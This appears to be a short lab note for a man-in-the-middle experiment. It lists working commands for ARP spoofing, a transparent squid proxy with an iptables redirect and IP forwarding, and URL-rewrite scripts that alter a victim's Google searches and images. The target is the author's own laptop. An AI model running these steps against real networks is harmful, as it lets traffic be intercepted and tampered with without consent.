To install, apt-get
    squid3, a proxy 
    apache2,
    
    imagemagick, optional
    ghostscript, optional
    jp2a, optional
    googleSearch.pl, optional, used to add words behind victim's google search query

To download, some funny scripts
    asciiImages.pl, to change images into ascii 
    googleSearch.pl, to add words behind google search keywords,

To config, 
    squid, 
        on ubuntu, vim /etc/squid/squid.conf
            1. search for "acl localnet src", and uncomment the line representing my network
            2. search for "http_access allow localnet", uncomment
            3. search for "http_port 3128", add " transparent" after 3128
            4. add "url_rewrite_program [path]", at the end of this file, e.g., "url_rewrite_program /home/hacker/work/BeAHacker/proxy/googleSearch.pl"
            5. restart squid, "service squid restart"
            6. add iptables rule, "iptables -t nat -A PREROUTING -i wlp3s0 -p tcp --destination-port 80 -j REDIRECT --to-port 3128"
            7. also, type in "echo 1 > /proc/sys/net/ipv4/ip_forward" 

            8. just as before, do arpspoof on my victim (my Macbook) "arpspoof -i wlp3s0 -t [gateway's ip] -r [victim's ip]"

    After the experiment, I found that the victim must use http connection inorder for this attack to be successful...
